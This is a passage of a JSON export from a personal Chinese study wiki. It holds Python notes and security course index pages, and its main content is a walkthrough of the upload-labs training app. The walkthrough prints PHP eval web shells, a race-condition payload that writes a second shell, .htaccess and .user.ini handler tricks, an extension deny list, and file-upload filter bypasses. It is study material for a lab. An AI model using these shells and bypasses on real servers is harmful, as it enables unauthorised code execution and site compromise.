output:可以看到computer1和computer的对象地址不同，但是他们的子对象disk和cpu都是一样的，说明他们的浅拷贝的是子对象中的引用\n  ```\n  disk1 \u003c__main__.Disk object at 0x000002114636BFD0\u003e\n  cpu1 \u003c__main__.CPU object at 0x000002114636BEE0\u003e\n  compouter1 \u003c__main__.Computer object at 0x000002114636BEB0\u003e\n  computer2 \u003c__main__.Computer object at 0x000002114636BDC0\u003e\n  \u003c__main__.Disk object at 0x000002114636BFD0\u003e\n  \u003c__main__.CPU object at 0x000002114636BEE0\u003e\n  True\n  False 2273215691648 2273215692464\n  False\n  ```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.13-%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8":{"title":"python.13 模块的使用","content":"\n\n- #python\n## 编码\npython解释器使用`Unicode`编码（内存）\n`.py`文件在硬盘上存储默认使用的是`utf-8`编码，可以在文件首部`encode=编码格式`进行指定，也可以通过别的方式进行指定（外存 ）\n## 读取文件内容\n```python\nopen('url',[module,encodeing])\n```\neg\n```python\nimport file\nf1=open('md.md','r',encoding='utf-=8')\nprint(f1.readlines())\nf1.close() #用完要关闭\n```\n\n文件的类型：\n\t1. 文本文件\n\t2. 二进制文件\n打开模式：\n\tr只读打开，w只写，a追加\n\tb二进制打开，不能单独使用，如rb，wb\n\t+ 以读写方式打开，不能单独使用。如a+\n## 常用方法\n![img](https://tc3.doingnothing.online/assets/image_1678516380341_0.png)\n## with语句 上下文管理器\n作用：不需要手动执行close关闭文件流，当语句执行出with语句外的时候，就会自动关闭文件夹流的上下文\neg\n```python\nimport file\nwith open('md.md','r',encoding='utf-=8') as t:\n    print(t.read())\nprint(\"fdk\")\n```\n## os模块\n可以用来操作系统自带的命令，也可以用来启动可执行文件等等\n![img](https://tc3.doingnothing.online/assets/image_1678518372445_0.png)\neg\n```python\nimport os\n# 使用系统自带的cmd命令\nos.system(\"notepad\") #打开记事本\nos.system(\"ping www.baidu.com\") #执行ping\n# 打开可执行完文件\nos.startfile(\"E:\\\\fanqiiang\\\\Clash.for.Windows-0.20.5-win\\\\Clash for Windows.exe\")\n```\n### os.path操作目录的一些常用方法\n```python\nfrom os import path\n# 获取绝对路径\nprint(path.abspath('E:\\fanqiiang\\Clash.for.Windows-0.20.5-win\\Clash for Windows.exe'))\nprint(path.abspath('file.py'))\nprint(\"获取是否存在=============\")\nprint(path.exists(\"file.py\"))\nprint(\"目录与文件名拼接======\")\nprint(path.join(\"E:\\\\fjks\",\"fd.exe\"))\nprint(\"目录与文件名分离=========\")\nprint(path.splitext(\"fd.exe\"))\nprint(\"提取文件名===========\")\nprint(path.basename(\"E:\\\\fanqiiang\\Clash.for.Windows-0.20.5-win\\\\Clash for Windows.exe\"))\nprint(\"提取路径=========\")\nprint(path.dirname(\"E:\\\\fanqiiang\\\\Clash.for.Windows-0.20.5-win\\\\Clash for Windows.exe\"))\nprint(\"判断是否是目录=======\")\nprint(path.isdir(\"E:\\\\fanqiiang\\\\Clash.for.Windows-0.20.5-win\\\\Clash for Windows.exe\"))\nprint(path.isdir(\"E:\\\\fanqiiang\\\\Clash.for.Windows-0.20.5-win\\\\Clash for Window\"))\n```\noutput\n```\n获取是否存在=============\nTrue\n目录与文件名拼接======\nE:\\fjks\\fd.exe\n目录与文件名分离=========\n('fd', '.exe')\n提取文件名===========\nClash for Windows.exe\n提取路径=========\nE:\\fanqiiang\\Clash.for.Windows-0.20.5-win\n判断是否是目录=======\nFalse\nFalse\n```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/python.15-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F":{"title":"python.15 学生管理系统","content":"\n\n- 不做这个，没有必要做这个，意义不大 #todo/丢弃\n- ## 功能模块\n- ![image.png](https://tc3.doingnothing.online/assets/image_1678520216267_0.png){:height 603, :width 774}\n-","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/sql%E6%B3%A8%E5%85%A5":{"title":"sql注入","content":"\n\n- 基础\n\t- [[01.什么是SQL注入]]\n\t- [[02.SQL注入之MYSQL语句语法]]\n\t- [[03.SQL注入之MYSQL系统库]]\n- [[mysql手工注入]]\n\t- [[2.1.SQL注入之sqli-labs环境搭建]]\n\t- [[2.2 SQL注入之MYSQL手工注入]]\n\t- [[2.3 SQL注入之高权限注入上]]\n\t- [[2.4 SQL注入之高权限注入下]]\n\t- [[2.5 SQL注入之文件读写]]\n- 3-数据类型与提交方式\n\t- [[3.1SQL注入之数据类型]]\n\t- [[3.2SQL注入之提交方式]]\n\t- [[3.3SQL注入靶场案例练习]]\n- 4-查询方式及报错注入\n\t- [[4.1_2 SQL注入之查询方式]]\n\t- [[4.3SQL注入之延时注入]]\n\t- [[4.4SQL注入之布尔盲注]]\n\t- [[4.5SQL注入之加解密注入]]\n\t- [[4.6SQL注入之堆叠注入]]\n- 5-[[WAF]]绕过\n\t- [[5.1SQL注入之WAF绕过]]\n- 6-SQL注入之sqlmap\n\t- [[6.1SQL注入之sqlmap使用-get型注入]]\n\t- [[6.2SQL注入之sqlmap使用-post注入]]\n- 7-[[SqlMap]]安装教程\n\t- [[SQLmap安装教程]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/ssrf":{"title":"ssrf","content":"- [[01-什么是SSRF漏洞]]\n- [[02-SSRF漏洞的防御]]\n- [[03-如何发现SSRF漏洞]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/test":{"title":"test","content":"```dataview\ntable\n```","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/upload-labs":{"title":"upload-labs","content":"- [[upload-labs安装]]\n- [[upload-labs闯关心得体会]]\n- [[upload-labs通关]]\n- [[upload-labs总结]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/upload-labs%E5%AE%89%E8%A3%85":{"title":"upload-labs安装","content":"\n- ## 集成环境版本\n- 下载集成环境（win）：https://github.com/c0ny1/upload-labs/releases\n- 集成环境可以直接使用，不用配置额外的东西，很方便\n-\n- ## 手动安装\n- 自行安装源码：https://github.com/c0ny1/upload-labs\n- 下载好之后，解压\n- phpstudy自带可以下载的php都是**非线程安全**（nts后缀）的，所以需要自己网上下载 配置好的Apache2.4+PHP7.4.22，**将这个php解压的文件夹放到已经安装好的phpstudy对应的目录下，因为phpstudy默认自带可以下载的没有该版本与内容** 内有使用说明\n  链接：https://pan.baidu.com/s/1eiEt2XseTZqigTZYrsgKtQ?pwd=8888\n- 创建一个网站，选择这个目录，注意php选择刚才解压到phpstudy的php中的选项\n- ![](https://tc3.doingnothing.online/imgs/202303311809974.png){:height 589, :width 575}\n- 把解压的upload-labs文件放到phpstudy的www中你创建网站的那个目录中\n- 安装成功 ![](https://tc3.doingnothing.online/imgs/202303311821762.png)\n- 注意：如果配置好了之后显示502错误，可以查看浏览器的代理工具是否关闭","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/upload-labs%E6%80%BB%E7%BB%93":{"title":"upload-labs总结","content":"\n\n- [[总结]]一下漏洞的原因\n\t- 最基础的就是前端的校验，基本都是通过js来实现，禁用了就没有效果了\n\t- 其次是通过后端的校验\n\t\t- http中post、get请求中携带的信息进行校验\n\t\t\t- 比如`content-type`的MIME校验\n\t\t- 文件名后缀的校验\n\t\t\t- 等价扩展名绕过\n\t\t\t- `.htaccess`、`.user.ini`等配置文件进行绕过\n\t\t\t\t- `.htaccess`文件可以指定某些后缀或者某些特定文件，以何种方式去执行，比如将acc文件用php的方式去执行\n\t\t\t\t- `.user.ini`则会将其作为配置文件进行运行\n\t\t- 字符相关\n\t\t\t- 大小写绕过\n\t\t\t- 空格绕过，一般都是windows的末尾空格\n\t\t\t- 点号绕过，一般也是windows\n\t\t\t- `::$DATA` 后缀绕过一般还是windows服务器中\n\t\t\t- 拼接绕过：上传文件名为 .php. .(点+php+点+空格+点)，绕一些==正则或者替换操作的==\n\t\t\t- 双写绕过，绕一些替换函数，一般都是替换为空白等等\n\t\t- 请求中截断绕过\n\t\t\t- GET 型`0x00`  截断：保存的文件名称携带在了url的参数中，或者http请求头部，可以使使用`0x00`的url编码`%00`放在中间，服务器解析到此处的时候，后面的内容就不再读取了\n\t\t\t- POST 型 `0x00` 截断：同理，不过保存的文件名放在了内容中，被加密，建议在末尾添加一个`+`号等等，使用16进制修改其请求，将其改为00，再发送请求包即可\n\t\t- 图片马相关\n\t\t\t- 文件头校验：修改文件头绕过即可\n\t\t\t- 文件内容检测：`copy logo.jpg/b+test.php/a test.jpg`，将一句话木马作为内容放到图片末尾去，读取的时候，会先读取到文件的内容\n\t\t\t\t- getimagesize()校验\n\t\t\t\t- exif_imagetype()绕过\n\t\t\t\t  id:: 64302d88-7270-4b2b-8698-a89ed60947f6\n\t\t\t- 二次渲染：使用一张渲染之后，还是可以作为图片马的即可。==二次渲染之后，依旧不变的地方，插入一句话木马==\n\t\t- 条件竞争：原理是通过服务器处理文件需要时间，但是在处理之前的这个过程中，文件在服务器上是可以被访问执行的\n\t\t\t- 条件竞争-图片马：使用burp suite不断上传一张可以生成一句话木马的图片马，然后访问其，使其执行生成一句话木马的文件，访问一句话木马进行连接\n\t\t\t- 小数点绕过\n\t\t\t- 数组绕过（这个没怎么懂，主要是没怎么看懂代码，也属于是代码的逻辑漏洞）\n\t\t\t-","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/upload-labs%E9%80%9A%E5%85%B3":{"title":"upload-labs通关","content":"\n  安装环境为集成版本：https://github.com/c0ny1/upload-labs/releases\n[[小技巧]]：\n\t在url中带入参数访问：\n\t`http://localhost/upload/1.jpg?1=system(%27dir%27);`\n需要一个shell.php一句话木马万文件\n```\n  \u003c?php\n    header(\"Content-type:text/html;charset=gb1232\");\n    echo \"\u003cpre\u003e\";\n    @eval($_POST['a']); \n  ?\u003e\n  ```\n## 注意\n\u003e 所使用的的是**20**关版本的那个集成环境，非后面的21关版本，所差的是**空格绕过**\n## 第一关（前端验证）\n  \n  关闭js，或者删除验证代码 直接上传，提示不支持上传php文件![](https://tc3.doingnothing.online/imgs/202303311830845.png)\n修改前端代码，取消文件类型的验证，或者关闭[JavaScript](https://wiki.doingnothing.online/#JavaScript)![](https://tc3.doingnothing.online/imgs/202303311834290.png)\n禁用[JavaScript](https://wiki.doingnothing.online/#JavaScript)，**单个页面**f12之后f1,然后找到`停用JavaScript`, 禁用浏览器所有[JavaScript](https://wiki.doingnothing.online/#JavaScript)，在设置里面搜。\n右键复制图片地址，放到[[../../../../pages/中国蚁剑]]中去，密码为一句话木马中的evel中的变量![](https://tc3.doingnothing.online/imgs/202303311851292.png)\n## 第二关（MIME）\n\n前后端都有验证：使用抓包工具对mime修改欺骗前后端\n使用[[../../../../pages/burp sulite]]工具抓包，修改其的返回的mime格式![](https://tc3.doingnothing.online/imgs/202303311915519.png)\n  \n  扩展：MIME 描述\n  \n  | text/html | HTML格式 |\n  | ---| ---| ---|\n  | application/json | JSON数据格式 |\n  | multipart/form-data | 文件上传（二进制数据） |\n  | image/jpeg | jpg图片格式 |\n用法：\n  客户端使用： 1、GET请求不需要这个字段。 2、POST请求头，放在Content Type字段用来指定上传的 文件类型，方便服务器解析。放在Accept，告诉服务端允许 接收的响应类型。比如只能接收json或者其他。\n  服务端使用：\n  1、放在响应头里面，Content Type告诉客户端响应的数据 类型，方便客户端解析。\n## 第三关（等价扩展名 ）\n\n前后端判断文件扩展名：使用等价扩展名\n把shell.php改成`shell.php3`即可\n\n判断了等价扩展名：修改为png格式，后面可以把png作为php去执行\n\n| 语言 | 等价扩展名 |\n| ---| ---| ---|\n| asp | asa,cer,cdx |\n| aspx | ashx,asmx,ascx |\n| php | php2、php3、php4、php5、phps、phtml |\n| jsp | jspx,jspf |\n## 第四关（黑名单验证，.htaccess）\n\n上传`.htaccess`文件，内容如下\n\n```\nAddType application/x-httpd-php .png\n或者\n\u003cFilesMatch \"文件名\"\u003e\nSetHandler application/x-httpd-php\n\u003c/FilesMatch\u003e\n```\n\n然后上传一句话木马伪装的png文件\n[[扩展]]\n\tapachhe的配置文件`.htaccess`可以配置对不同文件扩展名的执行方式，比如使用把`png`文件作为php格式去执行\n\t  伪静态：客户端访问的请求，服务端本来是php的，但是返回的页面是html格式，主要是为了方便搜索引擎收录。\n## 第五关（黑名单验证.user.ini）（Php）\n`.user.ini`的中配置的文件会作为配置文件来执行\n```\n  auto_prepend_file =666.jpg\n  ```\n验证的文件名，没有包含Php\n## 第六关（大小写绕过）\n命名`1.Php`\n设置的条件中，没有开头大写的`P`的过滤规则\n##  第七关（点号绕过）\n抓包，在文件名末尾加一个点好\n[[tips]]：在windows中，文件名末尾的点号会被自动去掉\n## 第八关（::$data绕过）\n抓包，文件名命名末尾加上`::$data`后缀即可\n## 第九关 （拼接绕过）\n[[解决]]：抓包，`1.Php`上传之后，在抓包数据中，将文件名改为`1.php. .`，后缀加上点 空格 点 空格，避免上面的替换以及删除。\n```php\n  $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n          $file_name = trim($_FILES['upload_file']['name']);\n          $file_name = deldot($file_name);//删除文件名末尾的点\n          $file_ext = strrchr($file_name, '.');\n          $file_ext = strtolower($file_ext); //转换为小写\n          $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n          $file_ext = trim($file_ext); //首尾去空\n  ```\n源代码解析： `1.php. .`\n  1. 删除了末尾的点 `1.php. `\n  2. 最后一个点后面的内容作为文件扩展名`. `\n  3. 转换大小写、去除特殊字符等等\n  4. 去空文件扩展名就变成了`.`\n  在执行的时候，windows会自动将末尾的点和空格去掉\n就变成了`1.PHp`\n-\n[[心得]]：一般这种用黑名单的方式都很容易被绕过，其次，这种方式是仅仅是使用了函数来避免，但是通过拼接、重复等等方式都能够很轻易的绕过，所以大多数的网站都是采用了白名单的方式。\n如果使用黑名单，那么建议的方式是结合正则多次筛选（使用循环避免这种问题，但是还是很难考虑全面）\n## 第十关（双写绕过）\n[[解决]]：`1.php`改为`1.pphphphpp`，替换之后，就会变成php文件\n` str_ireplace()`将文件路径中所有的特殊字符（不敏感大小写）全部置空，所以直接双写即可\n## 第十一关(get 0x00截断）\n原理：**系统在对文件名的读取时，如果遇到0x00,就会认为读取已结束**\n上传1.jpg图片马，然后抓包，将文件头部的上传路径修改末尾添加上`%00`，服务器读到此处，会自动停止读取\n![](https://tc3.doingnothing.online/imgs/202304071550576.png)\n## 第十二关（post 0x00截断）\n上传1.jpg，抓包\n文件路径没有携带在url中（get方式），而是放在了下面的content中，\n添加1.php文件名之后再末尾加个+号，方便修改16进制 ![](https://tc3.doingnothing.online/imgs/202304071607050.png)\n切换到16进制，找到加号所处的16进制数，改为00，发送数据包即可。\n![](https://tc3.doingnothing.online/imgs/202304071610743.png)\n## 第十三关 文件内容检测（文件头校验）\n制作图片马\n```cmd\n  copy 1.gif+1.shell 2.gif\n  ```\n上传这个图片,主页中有`include.php`，==使用这个文件去调用其他文件中的php内容==\n然后使用文件包含漏洞进行连接`http://localhost/include.php?file=upload/7820230407161751.gif`\n![](https://tc3.doingnothing.online/imgs/202304071620402.png)\n## 第十四关  文件内容检测 （getimagesize()校验）\n和上一关同理\n漏洞描述：通过 getimagesize()获取上传文件信息，图片马绕过\n  getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组\n## 第十五关 文件内容检测 （exif_imagetype()绕过）\n漏洞描述：利用 php 内置函数 exif_imagetype()获取图片类型（需要开启\n  php_exif 模块）\n  利用方法：\n  (1)图片马\n  (2)预定义高度宽度：\n  例 .htaccess 文件\n  文件内容\n  #define width 1337\n  #define height 1337\n  文件内容---\n  (3)利用 x00x00x8ax39x8ax39 文件头\n  x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00 在.htaccess 文件中为是注释符，\n  不会影响文件本身。使用十六进制编辑器或者 python 的 bytes 字符类型(b’’)来进行\n  添加。\n  payload:shell = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"+b\"00\" + '文件内容'\n## 第十六关（二次渲染）\n[[解决]]：找一张二次渲染，图片马代码依旧在其中的图片马\n服务器将获取到的图片，在图片中获取图片内容，然后重新将识别到的图片的内容获取，重新生成一张新的图片\n[[../../../../pages/软件工具]]：查看渲染之后是否还有马的代码的2进制比较工具 `010 editor`\n-\n-\n## 第十七关（条件竞争）\n代码\n```php\n  \u003c?PHP\n  echo md5(1);\n  fputs(fopen('3.php','w'),'\u003c?php @eval($_POST[1])?\u003e');\n  ?\u003e\n  ```\n原理：使用[[../../../../pages/条件竞争]]php代码上传之后，因为服务器校验和删除需要时间，一直上传该木马，会有短暂时间对其进行访问，此木马可以在服务器端生成新的一句话木马。\n步骤\n抓包，发送到intruder（ctrl+i），大量的发送包\n\t清楚自动添加的变量规则 ![](https://tc3.doingnothing.online/imgs/202304071706958.png)\n\t修改payload ![](https://tc3.doingnothing.online/imgs/202304071702348.png)\n\t修改并发量 ![](https://tc3.doingnothing.online/imgs/202304071705997.png)\n\t开始不停的发送请求\n使用python脚本去访问上传的文件，使其在服务端生成一句话木马文件（线程多，直接用浏览器访问都行）\n\t生成的一句话木马，然后用这个木马连接即可 ![](https://tc3.doingnothing.online/imgs/202304071712463.png)\n\t-\n## 第十八关（ 逻辑漏洞（条件竞争-图片马）\n和十七关一样，不同的时，十八关主要在于重命名，可以通过发送大量请求，在服务器没有成功重命名之前访问其图片马，使其生成新的php木马文件\nabout:[[../../../../pages/条件竞争]]\n## 第十九关（小数点绕过）\n  漏洞描述：使用 pathinfo($file_name,PATHINFO_EXTENS\n## 第二十关（数组+/.绕过）\n[[遗留问题]]：没搞成功\n![](https://tc3.doingnothing.online/imgs/202304072235332.png)","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/upload-labs%E9%97%AF%E5%85%B3%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A":{"title":"upload-oabs鹅汤馆新","content":"\n- [[心得]]\n- 有一些遗留问题，比如说是对于操作的不够熟练，不过大概是知晓了基本的原理了。","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/xss":{"title":"xss","content":"- [[01-http协议常用的请求方式]]\n- [[02-什么是cookie]]\n- [[03-什么是session]]\n- [[04-javaScript操作cookie]]\n- [[05-脚本注入xss]]\n- [[06-获取cookie发送到邮件]]\n- [[07-xss的检测与利用]]\n- [[08-xss防御方法]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/xxe":{"title":"xxe","content":"- [[01-xml基础知识]]\n- [[02-XXE漏洞]]\n- [[03-XXE-Lab]]\n- [[04-XXE防御方法]]","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null}}